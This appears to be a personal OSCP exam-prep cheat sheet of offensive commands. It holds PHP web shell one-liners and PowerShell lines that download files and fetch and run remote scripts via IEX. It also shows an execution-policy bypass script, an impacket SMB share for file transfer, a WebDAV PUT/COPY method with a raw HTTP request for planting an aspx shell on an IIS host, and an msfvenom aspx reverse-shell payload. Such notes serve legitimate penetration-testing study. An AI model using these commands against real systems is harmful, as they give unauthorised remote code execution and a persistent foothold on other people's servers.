# OSCP_Prep

Simple php cmd shell
	<?php echo system($_GET["cmd"]); ?>
	<?php echo shell_exec($_GET["cmd"]); ?>

Run cmd from cmdshell:
	cmd /c
	cmd /k


# Powershell download a file
	powershell.exe  (New-Object System.Net.WebClient).DownloadFile("https://example.com/archive.zip", "C:\Windows\Temp\archive.zip") 


# Powershell download an execute file
	powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://<IP>/<script>')"


# Powershell execution restricted
	echo $storageDir = $pwd > wget.ps1
	echo $webclient = New-Object System.Net.WebClient >>wget.ps1
	echo $url = "http://192.168.1.101/file.exe" >>wget.ps1
	echo $file = "output-file.exe" >>wget.ps1
	echo $webclient.DownloadFile($url,$file) >>wget.ps1
	powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
	OR
	powershell.exe -nop -ep bypass -c wget.ps1



 
# Transfer file with SMB 
	sudo impacket-smbserver ROPNOP /sherad/folder

    Check share on target host:
	net view \\shareIP
	ls \\shareIP\ROPNOP


# IIS WebDav exploatation
	Use "cadaver" to check PUT method and directory listing
	Use "davtest" to check writable extentions
 	
	Use PUT method to save cmdaspx.aspx file content as txt file
	USE COPY method to copy cmdaspx.txt to cmdaspx.aspx
	
	```
	COPY /cmdaspx.txt HTTP/1.1
	Host: 10.10.10.15
	User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
	Accept-Language: en-US,en;q=0.5
	Accept-Encoding: gzip, deflate
	Connection: close
	Destination:  http://10.10.10.15/cmdaspx.aspx
	```

	Generate aspx reverse shell 
		msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=10.10.14.7 LPORT=1234 -o shell.aspx



